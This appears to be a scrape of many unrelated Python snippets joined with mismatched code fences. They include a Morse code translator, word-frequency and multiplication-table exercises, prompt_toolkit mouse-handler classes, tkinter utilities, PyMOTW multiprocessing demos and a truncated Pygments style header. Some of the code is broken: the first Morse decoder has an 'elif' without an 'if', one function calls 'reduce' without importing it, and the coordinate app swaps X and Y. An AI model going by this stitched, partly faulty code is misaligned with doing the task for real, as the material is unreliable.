                  "--..." : "7",
                  "---.." : "8",
                  "----." : "9",
                  "-----" : "0",
                  "SPACE" : " "}
    morseCode.strip()
    new = morseCode.replace("   ", " SPACE ")
    prep = new.split()
    res = ""
    li = list(morse_code.keys())
    for n in prep:
        elif n in li:
            res = res + morse_code[n]

        else:
            pass
    return res.strip()

# Python program to implement Morse Code Translator

# Dictionary representing the morse code chart
MORSE_CODE_DICT = {
    "A": ".-",
    "B": "-...",
    "C": "-.-.",
    "D": "-..",
    "E": ".",
    "F": "..-.",
    "G": "--.",
    "H": "....",
    "I": "..",
    "J": ".---",
    "K": "-.-",
    "L": ".-..",
    "M": "--",
    "N": "-.",
    "O": "---",
    "P": ".--.",
    "Q": "--.-",
    "R": ".-.",
    "S": "...",
    "T": "-",
    "U": "..-",
    "V": "...-",
    "W": ".--",
    "X": "-..-",
    "Y": "-.--",
    "Z": "--..",
    "1": ".----",
    "2": "..---",
    "3": "...--",
    "4": "....-",
    "5": ".....",
    "6": "-....",
    "7": "--...",
    "8": "---..",
    "9": "----.",
    "0": "-----",
    "&": ".-...",
    "@": ".--.-.",
    ":": "---...",
    ",": "--..--",
    ".": ".-.-.-",
    "'": ".----.",
    '"': ".-..-.",
    "?": "..--..",
    "/": "-..-.",
    "=": "-...-",
    "+": ".-.-.",
    "-": "-....-",
    "(": "-.--.",
    ")": "-.--.-",
    # Exclamation mark is not in ITU-R recommendation
    "!": "-.-.--",
}


def encrypt(message: str) -> str:
    cipher = ""
    for letter in message:
        if letter != " ":
            cipher += MORSE_CODE_DICT[letter] + " "
        else:
            cipher += "/ "

    # Remove trailing space added on line 64
    return cipher[:-1]


def decrypt(message: str) -> str:
    decipher = ""
    letters = message.split(" ")
    for letter in letters:
        if letter != "/":
            decipher += list(MORSE_CODE_DICT.keys())[
                list(MORSE_CODE_DICT.values()).index(letter)
            ]
        else:
            decipher += " "

    return decipher


def main() -> None:
    message = "Morse code here"
    result = encrypt(message.upper())
    print(result)

    message = result
    result = decrypt(message)
    print(result)


if __name__ == "__main__":
    main()

def top_k_frequent(words, k):
  """
  Input:
  words -> List[str]
  k -> int
  Output:
  List[str]
  """
  frequency = {}

  for word in words:
    if word in frequency:
      frequency[word] += 1
    else:
      frequency[word] = 1

  sorted_data = sorted(frequency, key=lambda word: (-frequency[word], word))

  return sorted_data[:k]

def helper(word):


  return word

# Tests
print(top_k_frequent(["the", "sky", "is", "cloudy", "the", "the", "the", "cloudy", "is", "is"], 4))
print(top_k_frequent(["lambda", "school", "rules", "lambda", "school", "rocks"], 2))


# # Output
#
# ['the', 'is', 'cloudy', 'sky']
# ['lambda', 'school']
```

````py
Mouse events.


How it works
------------

The renderer has a 2 dimensional grid of mouse event handlers.
(`prompt_toolkit.layout.MouseHandlers`.) When the layout is rendered, the
`Window` class will make sure that this grid will also be filled with
callbacks. For vt100 terminals, mouse events are received through stdin, just
like any other key press. There is a handler among the key bindings that
catches these events and forwards them to such a mouse event handler. It passes
through the `Window` class where the coordinates are translated from absolute
coordinates to coordinates relative to the user control, and there
`UIControl.mouse_handler` is called.```


```py
from enum import Enum

from .data_structures import Point

__all__ = ["MouseEventType", "MouseEvent"]


class MouseEventType(Enum):
    MOUSE_UP = "MOUSE_UP"
    MOUSE_DOWN = "MOUSE_DOWN"
    MOUSE_DOWN_MOVE = "MOUSE_DOWN_MOVE"
    SCROLL_UP = "SCROLL_UP"
    SCROLL_DOWN = "SCROLL_DOWN"


class MouseEvent:
    """
    Mouse event, sent to `UIControl.mouse_handler`.

    :param position: `Point` instance.
    :param event_type: `MouseEventType`.
    """

    def __init__(self, position: Point, event_type: MouseEventType) -> None:
        self.position = position
        self.event_type = event_type

    def __repr__(self) -> str:
        return "MouseEvent(%r, %r)" % (self.position, self.event_type)

from collections import defaultdict
from itertools import product
from typing import Callable, DefaultDict, Tuple

from prompt_toolkit.mouse_events import MouseEvent

__all__ = [
    "MouseHandler",
    "MouseHandlers",
]

MouseHandler = Callable[[MouseEvent], None]


class MouseHandlers:
    """
    Two dimensional raster of callbacks for mouse events.
    """

    def __init__(self) -> None:
        def dummy_callback(mouse_event: MouseEvent) -> None:
            """
            :param mouse_event: `MouseEvent` instance.
            """

        # NOTE: Previously, the data structure was a dictionary mapping (x,y)
        # to the handlers. This however would be more inefficient when copying
        # over the mouse handlers of the visible region in the scrollable pane.

        # Map y (row) to x (column) to handlers.
        self.mouse_handlers: DefaultDict[
            int, DefaultDict[int, MouseHandler]
        ] = defaultdict(lambda: defaultdict(lambda: dummy_callback))

    def set_mouse_handler_for_range(
        self,
        x_min: int,
        x_max: int,
        y_min: int,
        y_max: int,
        handler: Callable[[MouseEvent], None],
    ) -> None:
        """
        Set mouse handler for a region.
        """
        for y in range(y_min, y_max):
            row = self.mouse_handlers[y]

            for x in range(x_min, x_max):
                row[x] = handler


# Mouse Pointer Co-ordinates Getter

# Imported necessary library
from tkinter import *
import tkinter.messagebox as mbox
import pyautogui

window = Tk()
window.title("Mouse Pointer Co-ordinates Getter")
window.geometry("1200x700")

top1 = Label(window, text="GET MOUSE POINTER CO-ORDINATES", font=("Arial", 35,'underline'), fg="magenta")
top1.place(x = 50, y = 10)

top1 = Label(window, text="CO - ORDINATES", font=("Arial", 50), fg="blue")
top1.place(x = 220, y = 150)

top1 = Label(window, text="Move the mouse on the screen and it will display\nthe co-ordinates of mouse cursor on the screen", font=("Arial", 30), fg="green")
top1.place(x = 50, y = 500)

l1 = Label(window, fg='blue', font=("Arial", 50))
l1.place(x = 150, y = 300)

def update_label():
    coordinates = pyautogui.position()
    coordinates = "( X , Y )  :  ( " + str(coordinates[1]) + ' , ' + str(coordinates[0]) + ' )'
    l1.configure(text=coordinates)
    window.after(1, update_label)

update_label()


# function for exiting window
def exit_win():
    if mbox.askokcancel("Exit", "Do you want to exit?"):
        window.destroy()

window.protocol("WM_DELETE_WINDOW", exit_win)
window.mainloop()


# MP4 to MP3 Converter


# imported necessary library
from tkinter import *
import tkinter as tk
from tkinter import filedialog
import tkinter.messagebox as mbox
from PIL import Image, ImageTk
import moviepy
import moviepy.editor
import os


# created a main window
window=Tk()
window.title('MP4 to MP3 Converter')
window.geometry("1000x700")


# top label
start1 = tk.Label(text = "MP4  to  MP3  Converter", font=("Arial", 50), fg="magenta") # same way bg
start1.place(x = 130, y = 10)

# image on the main window
path = "Images/convert.jpg"
# Creates a Tkinter-compatible photo image, which can be used everywhere Tkinter expects an image object.
img1 = ImageTk.PhotoImage(Image.open(path))
# The Label widget is a standard Tkinter widget used to display a text or image on the screen.
panel = tk.Label(window, image = img1)
panel.place(x = 170, y = 120)

def mp4_choose():
    global filename,onlyfilename
    filename = filedialog.askopenfilename(initialdir="/", title="Choose MP4",filetypes=(("Text files", "*.Mp4*"), ("all files", "*.*")))
    # Change label contents
    # label_file_explorer.configure(text="File : " + filename)
    onlyfilename = os.path.basename(filename)
    fname.delete('1.0', END)
    fname.insert(END, onlyfilename)

# select label
select1 = tk.Label(text = "Select MP4 File : ", font=("Arial", 30), fg="brown") # same way bg
select1.place(x = 50, y = 500)

# textarea for file name only
fname = Text(window,height = 1, width = 23, font=("Arial", 25), bg = "light yellow", fg = "brown", borderwidth=2, relief="solid")
fname.place(x=360, y = 505)

# created a choose button , to choose the image from the local system
chooseb = Button(window, text='SELECT', command=mp4_choose, font=("Arial", 17), bg = "light green", fg = "blue", borderwidth=3, relief="raised")
chooseb.place(x=800, y=500)

# Function for convert Mp4 to Mp3
def convert():
    video = moviepy.editor.VideoFileClip(filename)
    # Convert video to audio
    audio=video.audio

    aud_fname = ""
    for i in onlyfilename:
        if i == '.':
            break
        else:
            aud_fname = aud_fname + i
    print(aud_fname)
    audio.write_audiofile(f'{aud_fname}.mp3')
    mbox.showinfo("Success", "Video converted to Audio.\n\nAudio Saved Successfully")

# created a choose button , to choose the image from the local system
convertb = Button(window, text='CONVERT MP4 To MP3', command=convert, font=("Arial", 20), bg = "light green", fg = "blue", borderwidth=3, relief="raised")
convertb.place(x=150, y=600)

# defined exit_win function, to show a exit dialog box when tried to exit
def exit_win():
    if mbox.askokcancel("Exit", "Do you want to exit?"):
        window.destroy()

# creating an exit button
exitB = Button(window, text='EXIT', command=exit_win, font=("Arial", 20), bg = "red", fg = "blue", borderwidth=3, relief="raised")
exitB.place(x = 750, y = 600)

# this is done to show the exit dialog box when tried to exit from the main window, using the top-roght close button of titlebar
window.protocol("WM_DELETE_WINDOW", exit_win)
window.mainloop()


def mult(a, b):
    s = 80
    z = add(s, 10)
    return a * b + z

def add(n1, n2):
    return n1 + n2

x = 10
y = 20

mult(x, y)
print("123")
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from multiprocessing import Process
import os

#
def run_proc(name):
    print("Run child process %s (%s)..." % (name, os.getpid()))


if __name__ == "__main__":
    print("Parent process %s." % os.getpid())
    p = Process(target=run_proc, args=("test",))
    print("Child process will start.")
    p.start()
    p.join()
    print("Child process end.")

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import time, threading

#:
def loop():
    print("thread %s is running..." % threading.current_thread().name)
    n = 0
    while n < 5:
        n = n + 1
        print("thread %s >>> %s" % (threading.current_thread().name, n))
        time.sleep(1)
    print("thread %s ended." % threading.current_thread().name)


print("thread %s is running..." % threading.current_thread().name)
t = threading.Thread(target=loop, name="LoopThread")
t.start()
t.join()
print("thread %s ended." % threading.current_thread().name)

from __future__ import annotations

from typing import Any
import numpy as np

AR_f8: np.ndarray[Any, np.dtype[np.float64]] = np.array([1.0])
AR_i8: np.ndarray[Any, np.dtype[np.int_]] = np.array([1])

b_f8 = np.broadcast(AR_f8)
b_i8_f8_f8 = np.broadcast(AR_i8, AR_f8, AR_f8)

next(b_f8)
next(b_i8_f8_f8)

b_f8.reset()
b_i8_f8_f8.reset()

b_f8.index
b_i8_f8_f8.index

b_f8.iters
b_i8_f8_f8.iters

b_f8.nd
b_i8_f8_f8.nd

b_f8.ndim
b_i8_f8_f8.ndim

b_f8.numiter
b_i8_f8_f8.numiter

b_f8.shape
b_i8_f8_f8.shape

b_f8.size
b_i8_f8_f8.size

from sklearn.neural_network import MLPClassifier

X = [[0.0, 0.0], [1.0, 1.0], [1.0, 0.0], [0.0, 1.0]]
y = [0, 1, 0, 0]


clf = MLPClassifier(
    solver="lbfgs", alpha=1e-5, hidden_layer_sizes=(5, 2), random_state=1
)

clf.fit(X, y)


test = [[0.0, 0.0], [0.0, 1.0], [1.0, 1.0]]
Y = clf.predict(test)


def wrapper(Y):
    """
    >>> wrapper(Y)
    [0, 0, 1]
    """
    return list(Y)


if __name__ == "__main__":
    import doctest

    doctest.testmod()

#!/usr/bin/env python3
# -*- coding: utf-8 -*-
````

````pyMultimap module."""

from collections import OrderedDict
from typing import Any, List, Optional


class Multimap(object):
    """Multimap class."""

    def __init__(self) -> None:
        """Make new multimap."""
        # maybe defaultdict(set) is better
        self._map: OrderedDict[Optional[str], List[Any]] = OrderedDict()

    def set(self, key: Optional[str], value: Any) -> None:
        """Set value."""
        _set = self._map.get(key)
        if not _set:
            _set = list()
            self._map[key] = _set
        if value not in _set:
            _set.append(value)

    def get(self, key: Optional[str]) -> List[Any]:
        """Get values."""
        return self._map.get(key, list())

    def has(self, key: Optional[str]) -> bool:
        """Check key is in this map."""
        return key in self._map

    def hasValue(self, key: Optional[str], value: Any) -> bool:
        """Check value is in this map."""
        _set = self._map.get(key, list())
        return value in _set

    def size(self) -> int:
        """Length of this map."""
        return len(self._map)

    def delete(self, key: Optional[str], value: Any) -> bool:
        """Delete value from key."""
        values = self.get(key)
        result = value in values
        if result:
            values.remove(value)
        if len(values) == 0:
            self._map.pop(key)
        return result

    def deleteAll(self, key: Optional[str]) -> None:
        """Delete all value of the key."""
        self._map.pop(key, None)

    def firstValue(self, key: Optional[str]) -> Any:
        """Get first value of the key."""
        _set = self._map.get(key)
        if not _set:
            return None
        return _set[0]

    def firstKey(self) -> Optional[str]:
        """Get first key."""
        return next(iter(self._map.keys()))

    def valuesArray(self) -> List[Any]:
        """Get all values as list."""
        result: List[Any] = list()
        for values in self._map.values():
            result.extend(values)
        return result

    def clear(self) -> None:
        """Clear all entries of this map."""
        self._map.clear()

from __future__ import division
from math import ceil
from itertools import combinations
from operator import mul

# Sum of multiples of 3 or 5 under 1000, simplified:
# print (3 * 333 * 334 / 2) + (5 * 199 * 200 / 2) - (15 * 66 * 67 / 2)


def getSumOfMultiple(num, limit):
    return int((ceil(limit / num) - 1) * ceil(limit / num) * num / 2)


def getSumOfMultiples(multiples, limit):
    result = 0
    sign = 1
    for i in range(1, len(multiples) + 1):
        for x in combinations(multiples, i):
            result += sign * getSumOfMultiple(reduce(mul, x, 1), limit)
        sign *= -1
    return result

# take a number as an input from user and print a multiplication table of that number


def multiplication_table():
    value = int(input("please type a number: "))
    for num in range(1, 11):
        print(f"{value} * {num} = {value * num}")


multiplication_table()

# Multiplication Table viewer

while True:
    startOrEnd = str(input("Start or End : "))
    if startOrEnd == "Start":
        whichTable = int(input("Which Table : "))
        for x in range(1, 13):
            table = whichTable * x
            print(table)
        continue
    else:
        print("Program Ended...")
        break

#```


```pyUsing a Condition to control sequencing between workers.```


```py
#end_pymotw_header
import multiprocessing
import time


def stage_1(cond):
    """perform first stage of work,
    then notify stage_2 to continue
    """
    name = multiprocessing.current_process().name
    print('Starting', name)
    with cond:
        print('{} done and ready for stage 2'.format(name))
        cond.notify_all()


def stage_2(cond):
    """wait for the condition telling us stage_1 is done"""
    name = multiprocessing.current_process().name
    print('Starting', name)
    with cond:
        cond.wait()
        print('{} running'.format(name))


if __name__ == '__main__':
    condition = multiprocessing.Condition()
    s1 = multiprocessing.Process(name='s1',
                                 target=stage_1,
                                 args=(condition,))
    s2_clients = [
        multiprocessing.Process(
            name='stage_2[{}]'.format(i),
            target=stage_2,
            args=(condition,),
        )
        for i in range(1, 3)
    ]

    for c in s2_clients:
        c.start()
        time.sleep(1)
    s1.start()

    s1.join()
    for c in s2_clients:
        c.join()

#```


```pyDaemon vs. non-daemon processes.```


```py

#end_pymotw_header
import multiprocessing
import time
import sys


def daemon():
    p = multiprocessing.current_process()
    print('Starting:', p.name, p.pid)
    sys.stdout.flush()
    time.sleep(2)
    print('Exiting :', p.name, p.pid)
    sys.stdout.flush()


def non_daemon():
    p = multiprocessing.current_process()
    print('Starting:', p.name, p.pid)
    sys.stdout.flush()
    print('Exiting :', p.name, p.pid)
    sys.stdout.flush()


if __name__ == '__main__':
    d = multiprocessing.Process(
        name='daemon',
        target=daemon,
    )
    d.daemon = True

    n = multiprocessing.Process(
        name='non-daemon',
        target=non_daemon,
    )
    n.daemon = False

    d.start()
    time.sleep(1)
    n.start()

#```


```pyDaemon vs. non-daemon processes.```


```py

#end_pymotw_header
import multiprocessing
import time
import sys


def daemon():
    name = multiprocessing.current_process().name
    print('Starting:', name)
    time.sleep(2)
    print('Exiting :', name)


def non_daemon():
    name = multiprocessing.current_process().name
    print('Starting:', name)
    print('Exiting :', name)


if __name__ == '__main__':
    d = multiprocessing.Process(
        name='daemon',
        target=daemon,
    )
    d.daemon = True

    n = multiprocessing.Process(
        name='non-daemon',
        target=non_daemon,
    )
    n.daemon = False

    d.start()
    time.sleep(1)
    n.start()

    d.join()
    n.join()

#```


```pyDaemon vs. non-daemon processes.```


```py

#end_pymotw_header
import multiprocessing
import time
import sys


def daemon():
    name = multiprocessing.current_process().name
    print('Starting:', name)
    time.sleep(2)
    print('Exiting :', name)


def non_daemon():
    name = multiprocessing.current_process().name
    print('Starting:', name)
    print('Exiting :', name)


if __name__ == '__main__':
    d = multiprocessing.Process(
        name='daemon',
        target=daemon,
    )
    d.daemon = True

    n = multiprocessing.Process(
        name='non-daemon',
        target=non_daemon,
    )
    n.daemon = False

    d.start()
    n.start()

    d.join(1)
    print('d.is_alive()', d.is_alive())
    n.join()

#```


```pyUsing Events to synchronize threads.```


```py

#end_pymotw_header
import multiprocessing
import time


def wait_for_event(e):
    """Wait for the event to be set before doing anything"""
    print('wait_for_event: starting')
    e.wait()
    print('wait_for_event: e.is_set()->', e.is_set())


def wait_for_event_timeout(e, t):
    """Wait t seconds and then timeout"""
    print('wait_for_event_timeout: starting')
    e.wait(t)
    print('wait_for_event_timeout: e.is_set()->', e.is_set())


if __name__ == '__main__':
    e = multiprocessing.Event()
    w1 = multiprocessing.Process(
        name='block',
        target=wait_for_event,
        args=(e,),
    )
    w1.start()

    w2 = multiprocessing.Process(
        name='nonblock',
        target=wait_for_event_timeout,
        args=(e, 2),
    )
    w2.start()

    print('main: waiting before calling Event.set()')
    time.sleep(3)
    e.set()
    print('main: event is set')

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


#end_pymotw_header
import multiprocessing
import sys
import time


def exit_error():
    sys.exit(1)


def exit_ok():
    return


def return_value():
    return 1


def raises():
    raise RuntimeError('There was an error!')


def terminated():
    time.sleep(3)


if __name__ == '__main__':
    jobs = []
    funcs = [
        exit_error,
        exit_ok,
        return_value,
        raises,
        terminated,
    ]
    for f in funcs:
        print('Starting process for', f.__name__)
        j = multiprocessing.Process(target=f, name=f.__name__)
        jobs.append(j)
        j.start()

    jobs[-1].terminate()

    for j in jobs:
        j.join()
        print('{:>15}.exitcode = {}'.format(j.name, j.exitcode))

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


#end_pymotw_header
import multiprocessing
import logging
import sys


def worker():
    print('Doing some work')
    sys.stdout.flush()


if __name__ == '__main__':
    multiprocessing.log_to_stderr()
    logger = multiprocessing.get_logger()
    logger.setLevel(logging.INFO)
    p = multiprocessing.Process(target=worker)
    p.start()
    p.join()

#```


```pyCreating and waiting for a process```


```py

#end_pymotw_header
import multiprocessing
import multiprocessing_import_worker

if __name__ == '__main__':
    jobs = []
    for i in range(5):
        p = multiprocessing.Process(
            target=multiprocessing_import_worker.worker,
        )
        jobs.append(p)
        p.start()

#```


```pyCreating and waiting for a process```


```py
#end_pymotw_header
def worker():
    """worker function"""
    print('Worker')
    return

#```


```pyLocking via the 'with' statement```


```py
#end_pymotw_header
import multiprocessing
import sys


def worker_with(lock, stream):
    with lock:
        stream.write('Lock acquired via with\n')


def worker_no_with(lock, stream):
    lock.acquire()
    try:
        stream.write('Lock acquired directly\n')
    finally:
        lock.release()


lock = multiprocessing.Lock()
w = multiprocessing.Process(
    target=worker_with,
    args=(lock, sys.stdout),
)
nw = multiprocessing.Process(
    target=worker_no_with,
    args=(lock, sys.stdout),
)

w.start()
nw.start()

w.join()
nw.join()

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


#end_pymotw_header
import multiprocessing
import logging
import sys


def worker():
    print('Doing some work')
    sys.stdout.flush()


if __name__ == '__main__':
    multiprocessing.log_to_stderr(logging.DEBUG)
    p = multiprocessing.Process(target=worker)
    p.start()
    p.join()

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


#end_pymotw_header
import multiprocessing
import pprint


def worker(d, key, value):
    d[key] = value


if __name__ == '__main__':
    mgr = multiprocessing.Manager()
    d = mgr.dict()
    jobs = [
        multiprocessing.Process(
            target=worker,
            args=(d, i, i * 2),
        )
        for i in range(10)
    ]
    for j in jobs:
        j.start()
    for j in jobs:
        j.join()
    print('Results:', d)

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py

#end_pymotw_header
import collections
import itertools
import multiprocessing


class SimpleMapReduce:

    def __init__(self, map_func, reduce_func, num_workers=None):
        """
        map_func

          Function to map inputs to intermediate data. Takes as
          argument one input value and returns a tuple with the
          key and a value to be reduced.

        reduce_func

          Function to reduce partitioned version of intermediate
          data to final output. Takes as argument a key as
          produced by map_func and a sequence of the values
          associated with that key.

        num_workers

          The number of workers to create in the pool. Defaults
          to the number of CPUs available on the current host.
        """
        self.map_func = map_func
        self.reduce_func = reduce_func
        self.pool = multiprocessing.Pool(num_workers)

    def partition(self, mapped_values):
        """Organize the mapped values by their key.
        Returns an unsorted sequence of tuples with a key
        and a sequence of values.
        """
        partitioned_data = collections.defaultdict(list)
        for key, value in mapped_values:
            partitioned_data[key].append(value)
        return partitioned_data.items()

    def __call__(self, inputs, chunksize=1):
        """Process the inputs through the map and reduce functions
        given.

        inputs
          An iterable containing the input data to be processed.

        chunksize=1
          The portion of the input data to hand to each worker.
          This can be used to tune performance during the mapping
          phase.
        """
        map_responses = self.pool.map(
            self.map_func,
            inputs,
            chunksize=chunksize,
        )
        partitioned_data = self.partition(
            itertools.chain(*map_responses)
        )
        reduced_values = self.pool.map(
            self.reduce_func,
            partitioned_data,
        )
        return reduced_values

#```


```pyNaming threads```


```py

#end_pymotw_header
import multiprocessing
import time


def worker():
    name = multiprocessing.current_process().name
    print(name, 'Starting')
    time.sleep(2)
    print(name, 'Exiting')


def my_service():
    name = multiprocessing.current_process().name
    print(name, 'Starting')
    time.sleep(3)
    print(name, 'Exiting')


if __name__ == '__main__':
    service = multiprocessing.Process(
        name='my_service',
        target=my_service,
    )
    worker_1 = multiprocessing.Process(
        name='worker 1',
        target=worker,
    )
    worker_2 = multiprocessing.Process(  # default name
        target=worker,
    )

    worker_1.start()
    worker_2.start()
    service.start()

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


#end_pymotw_header
import multiprocessing


def producer(ns, event):
    ns.value = 'This is the value'
    event.set()


def consumer(ns, event):
    try:
        print('Before event: {}'.format(ns.value))
    except Exception as err:
        print('Before event, error:', str(err))
    event.wait()
    print('After event:', ns.value)


if __name__ == '__main__':
    mgr = multiprocessing.Manager()
    namespace = mgr.Namespace()
    event = multiprocessing.Event()
    p = multiprocessing.Process(
        target=producer,
        args=(namespace, event),
    )
    c = multiprocessing.Process(
        target=consumer,
        args=(namespace, event),
    )

    c.start()
    p.start()

    c.join()
    p.join()

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


#end_pymotw_header
import multiprocessing


def producer(ns, event):
    # DOES NOT UPDATE GLOBAL VALUE!
    ns.my_list.append('This is the value')
    event.set()


def consumer(ns, event):
    print('Before event:', ns.my_list)
    event.wait()
    print('After event :', ns.my_list)


if __name__ == '__main__':
    mgr = multiprocessing.Manager()
    namespace = mgr.Namespace()
    namespace.my_list = []

    event = multiprocessing.Event()
    p = multiprocessing.Process(
        target=producer,
        args=(namespace, event),
    )
    c = multiprocessing.Process(
        target=consumer,
        args=(namespace, event),
    )

    c.start()
    p.start()

    c.join()
    p.join()

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


#end_pymotw_header
import multiprocessing


def do_calculation(data):
    return data * 2


def start_process():
    print('Starting', multiprocessing.current_process().name)


if __name__ == '__main__':
    inputs = list(range(10))
    print('Input   :', inputs)

    builtin_outputs = map(do_calculation, inputs)
    print('Built-in:', builtin_outputs)

    pool_size = multiprocessing.cpu_count() * 2
    pool = multiprocessing.Pool(
        processes=pool_size,
        initializer=start_process,
    )
    pool_outputs = pool.map(do_calculation, inputs)
    pool.close()  # no more tasks
    pool.join()  # wrap up current tasks

    print('Pool    :', pool_outputs)

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


#end_pymotw_header
import multiprocessing


def do_calculation(data):
    return data * 2


def start_process():
    print('Starting', multiprocessing.current_process().name)


if __name__ == '__main__':
    inputs = list(range(10))
    print('Input   :', inputs)

    builtin_outputs = map(do_calculation, inputs)
    print('Built-in:', builtin_outputs)

    pool_size = multiprocessing.cpu_count() * 2
    pool = multiprocessing.Pool(
        processes=pool_size,
        initializer=start_process,
        maxtasksperchild=2,
    )
    pool_outputs = pool.map(do_calculation, inputs)
    pool.close()  # no more tasks
    pool.join()  # wrap up current tasks

    print('Pool    :', pool_outputs)

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


#end_pymotw_header
import multiprocessing
import time


class Consumer(multiprocessing.Process):

    def __init__(self, task_queue, result_queue):
        multiprocessing.Process.__init__(self)
        self.task_queue = task_queue
        self.result_queue = result_queue

    def run(self):
        proc_name = self.name
        while True:
            next_task = self.task_queue.get()
            if next_task is None:
                # Poison pill means shutdown
                print('{}: Exiting'.format(proc_name))
                self.task_queue.task_done()
                break
            print('{}: {}'.format(proc_name, next_task))
            answer = next_task()
            self.task_queue.task_done()
            self.result_queue.put(answer)


class Task:

    def __init__(self, a, b):
        self.a = a
        self.b = b

    def __call__(self):
        time.sleep(0.1)  # pretend to take time to do the work
        return '{self.a} * {self.b} = {product}'.format(
            self=self, product=self.a * self.b)

    def __str__(self):
        return '{self.a} * {self.b}'.format(self=self)


if __name__ == '__main__':
    # Establish communication queues
    tasks = multiprocessing.JoinableQueue()
    results = multiprocessing.Queue()

    # Start consumers
    num_consumers = multiprocessing.cpu_count() * 2
    print('Creating {} consumers'.format(num_consumers))
    consumers = [
        Consumer(tasks, results)
        for i in range(num_consumers)
    ]
    for w in consumers:
        w.start()

    # Enqueue jobs
    num_jobs = 10
    for i in range(num_jobs):
        tasks.put(Task(i, i))

    # Add a poison pill for each consumer
    for i in range(num_consumers):
        tasks.put(None)

    # Wait for all of the tasks to finish
    tasks.join()

    # Start printing results
    while num_jobs:
        result = results.get()
        print('Result:', result)
        num_jobs -= 1

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


#end_pymotw_header
import multiprocessing


class MyFancyClass:

    def __init__(self, name):
        self.name = name

    def do_something(self):
        proc_name = multiprocessing.current_process().name
        print('Doing something fancy in {} for {}!'.format(
            proc_name, self.name))


def worker(q):
    obj = q.get()
    obj.do_something()


if __name__ == '__main__':
    queue = multiprocessing.Queue()

    p = multiprocessing.Process(target=worker, args=(queue,))
    p.start()

    queue.put(MyFancyClass('Fancy Dan'))

    # Wait for the worker to finish
    queue.close()
    queue.join_thread()
    p.join()

#```


```pyMultiple concurrent access to a resource```


```py
#end_pymotw_header
import random
import multiprocessing
import time


class ActivePool:

    def __init__(self):
        super(ActivePool, self).__init__()
        self.mgr = multiprocessing.Manager()
        self.active = self.mgr.list()
        self.lock = multiprocessing.Lock()

    def makeActive(self, name):
        with self.lock:
            self.active.append(name)

    def makeInactive(self, name):
        with self.lock:
            self.active.remove(name)

    def __str__(self):
        with self.lock:
            return str(self.active)


def worker(s, pool):
    name = multiprocessing.current_process().name
    with s:
        pool.makeActive(name)
        print('Activating {} now running {}'.format(
            name, pool))
        time.sleep(random.random())
        pool.makeInactive(name)


if __name__ == '__main__':
    pool = ActivePool()
    s = multiprocessing.Semaphore(3)
    jobs = [
        multiprocessing.Process(
            target=worker,
            name=str(i),
            args=(s, pool),
        )
        for i in range(10)
    ]

    for j in jobs:
        j.start()

    while True:
        alive = 0
        for j in jobs:
            if j.is_alive():
                alive += 1
                j.join(timeout=0.1)
                print('Now running {}'.format(pool))
        if alive == 0:
            # all done
            break

#```


```pyCreating and waiting for a process```


```py

#end_pymotw_header
import multiprocessing


def worker():
    """worker function"""
    print('Worker')


if __name__ == '__main__':
    jobs = []
    for i in range(5):
        p = multiprocessing.Process(target=worker)
        jobs.append(p)
        p.start()

#```


```pyPassing arguments to threads when they are created```


```py

#end_pymotw_header
import multiprocessing


def worker(num):
    """thread worker function"""
    print('Worker:', num)


if __name__ == '__main__':
    jobs = []
    for i in range(5):
        p = multiprocessing.Process(target=worker, args=(i,))
        jobs.append(p)
        p.start()

#```


```pyCreating and waiting for a process```


```py

#end_pymotw_header
import multiprocessing


class Worker(multiprocessing.Process):

    def run(self):
        print('In {}'.format(self.name))
        return


if __name__ == '__main__':
    jobs = []
    for i in range(5):
        p = Worker()
        jobs.append(p)
        p.start()
    for j in jobs:
        j.join()

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


#end_pymotw_header
import multiprocessing
import time


def slow_worker():
    print('Starting worker')
    time.sleep(0.1)
    print('Finished worker')


if __name__ == '__main__':
    p = multiprocessing.Process(target=slow_worker)
    print('BEFORE:', p, p.is_alive())

    p.start()
    print('DURING:', p, p.is_alive())

    p.terminate()
    print('TERMINATED:', p, p.is_alive())

    p.join()
    print('JOINED:', p, p.is_alive())

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py

#end_pymotw_header
import multiprocessing
import string

from multiprocessing_mapreduce import SimpleMapReduce


def file_to_words(filename):
    """Read a file and return a sequence of
    (word, occurences) values.
    """
    STOP_WORDS = set([
        'a', 'an', 'and', 'are', 'as', 'be', 'by', 'for', 'if',
        'in', 'is', 'it', 'of', 'or', 'py', 'rst', 'that', 'the',
        'to', 'with',
    ])
    TR = str.maketrans({
        p: ' '
        for p in string.punctuation
    })

    print('{} reading {}'.format(
        multiprocessing.current_process().name, filename))
    output = []

    with open(filename, 'rt') as f:
        for line in f:
            # Skip comment lines.
            if line.lstrip().startswith('..'):
                continue
            line = line.translate(TR)  # Strip punctuation
            for word in line.split():
                word = word.lower()
                if word.isalpha() and word not in STOP_WORDS:
                    output.append((word, 1))
    return output


def count_words(item):
    """Convert the partitioned data for a word to a
    tuple containing the word and the number of occurences.
    """
    word, occurences = item
    return (word, sum(occurences))


if __name__ == '__main__':
    import operator
    import glob

    input_files = glob.glob('*.rst')

    mapper = SimpleMapReduce(file_to_words, count_words)
    word_counts = mapper(input_files)
    word_counts.sort(key=operator.itemgetter(1))
    word_counts.reverse()

    print('\nTOP 20 WORDS BY FREQUENCY\n')
    top20 = word_counts[:20]
    longest = max(len(word) for word, count in top20)
    for word, count in top20:
        print('{word:<{len}}: {count:5}'.format(
            len=longest + 1,
            word=word,
            count=count)
        )
````

````py
    pygments.styles.murphy
    ~~~~~~~~~~~~~~~~~~~~~~

    Murphy's style from CodeRay.

    :copyright: Copyright 2006-2021 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py

from pygments.style import Style
from pygments.token import Keyword, Name, Comment, String, Error, \
     Number, Operator, Generic, Whitespace


